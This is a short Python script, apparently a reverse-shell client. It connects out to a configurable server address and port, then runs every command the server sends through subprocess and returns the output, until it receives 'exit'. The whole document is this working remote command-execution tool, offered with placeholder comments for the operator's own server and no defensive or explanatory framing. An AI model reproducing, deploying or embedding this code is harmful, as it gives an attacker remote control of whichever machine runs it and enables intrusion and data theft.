import socket
import subprocess

# Set up the server address and port
server_address = '192.168.1.100'  # Replace with your server's IP address
server_port = 8080                # Replace with your server's port

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect((server_address, server_port))
client_socket.send(b"ss")
# Receive commands from the server and execute them
while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    print(output)
    client_socket.send(output.encode())

# Close the socket
client_socket.close()